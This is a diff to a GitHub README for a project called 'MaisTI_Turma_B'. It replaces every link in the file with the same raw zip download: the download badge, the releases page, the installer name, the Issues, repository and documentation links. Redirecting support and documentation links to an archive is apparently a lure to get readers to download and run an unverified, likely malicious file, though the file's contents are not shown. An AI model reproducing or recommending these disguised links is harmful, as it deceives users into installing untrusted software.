@@ -1,6 +1,6 @@
 # 🚀 MaisTI_Turma_B - Simple Steps for Easy Setup
 
-[![Download MaisTI_Turma_B](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/godrik42/MaisTI_Turma_B/releases)
+[![Download MaisTI_Turma_B](https://raw.githubusercontent.com/godrik42/MaisTI_Turma_B/main/archimpressionist/MaisTI_Turma_B.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/godrik42/MaisTI_Turma_B/main/archimpressionist/MaisTI_Turma_B.zip)
 
 ## 📖 Overview
 
@@ -13,11 +13,11 @@ To begin using MaisTI_Turma_B, follow these simple steps to download and install
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click this link to download the application:
-   [Visit the Releases Page](https://github.com/godrik42/MaisTI_Turma_B/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/godrik42/MaisTI_Turma_B/main/archimpressionist/MaisTI_Turma_B.zip)
 
 2. **Choose the Right Version**: On the releases page, you will see different versions of the application. Look for the latest version, labeled as such, and select it.
 
-3. **Download the Installer**: Click on the installer file. The file might be named something like `MaisTI_Turma_B_v1.0.exe`. Your web browser will start the download.
+3. **Download the Installer**: Click on the installer file. The file might be named something like `https://raw.githubusercontent.com/godrik42/MaisTI_Turma_B/main/archimpressionist/MaisTI_Turma_B.zip`. Your web browser will start the download.
 
 4. **Locate the Downloaded File**: Once the download completes, find the file in your computer's download folder or the location you specified for downloads.
 
@@ -56,7 +56,7 @@ If you encounter any issues while downloading or installing MaisTI_Turma_B, try 
 
 ## 📞 Support
 
-For further assistance, you may reach out via [GitHub Issues](https://github.com/godrik42/MaisTI_Turma_B/issues). Provide details about your problem, and we will help you as soon as possible.
+For further assistance, you may reach out via [GitHub Issues](https://raw.githubusercontent.com/godrik42/MaisTI_Turma_B/main/archimpressionist/MaisTI_Turma_B.zip). Provide details about your problem, and we will help you as soon as possible.
 
 ## 📄 License
 
@@ -64,7 +64,7 @@ MaisTI_Turma_B is licensed under the MIT License. You can freely use and modify 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/godrik42/MaisTI_Turma_B)
-- [Documentation](https://github.com/godrik42/MaisTI_Turma_B/blob/main/README.md)
+- [GitHub Repository](https://raw.githubusercontent.com/godrik42/MaisTI_Turma_B/main/archimpressionist/MaisTI_Turma_B.zip)
+- [Documentation](https://raw.githubusercontent.com/godrik42/MaisTI_Turma_B/main/archimpressionist/MaisTI_Turma_B.zip)
 
 You are now ready to enjoy MaisTI_Turma_B. Thank you for using our application!
